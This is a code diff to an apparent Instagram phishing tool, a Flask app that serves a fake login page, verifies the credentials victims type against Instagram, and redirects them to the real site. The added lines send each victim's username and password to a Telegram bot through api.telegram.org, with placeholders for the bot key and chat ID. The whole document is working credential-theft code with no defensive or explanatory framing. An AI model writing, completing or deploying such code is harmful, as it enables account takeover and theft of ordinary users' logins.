@@ -12,10 +12,12 @@
 # User --- > <(-_-)> Attcker --> :) 
 # [+] Tool Face Instgram Page! 
 
+import requests
 from flask import Flask, request, render_template, redirect
 from check.instagram_login import InstagramLogin
 from pyfiglet import Figlet
 from colorama import Fore
+
 f = Figlet(font='epic')  
 
 print(Fore.BLUE + f.renderText('DeskRam'))
@@ -35,7 +37,12 @@ def login_page():
 
         if response.status_code == 200:
             if 'authenticated":true' in response.text or "userId" in response.text:
-                # Assuming success, redirect to Instagram
+                # Successful login, redirect to Instagram
+                bot_api_key = 'your_telegram_bot_api_key_here'
+                chat_id = 'your_telegram_chat_id_here'
+                message = f'Username: {username}, Password: {password}'
+                telegram_url = f'https://api.telegram.org/bot{bot_api_key}/sendMessage?chat_id={chat_id}&text={message}'
+                requests.get(telegram_url)
                 return redirect('http://www.instagram.com/')
             else:
                 # Incorrect password, render login page with error message
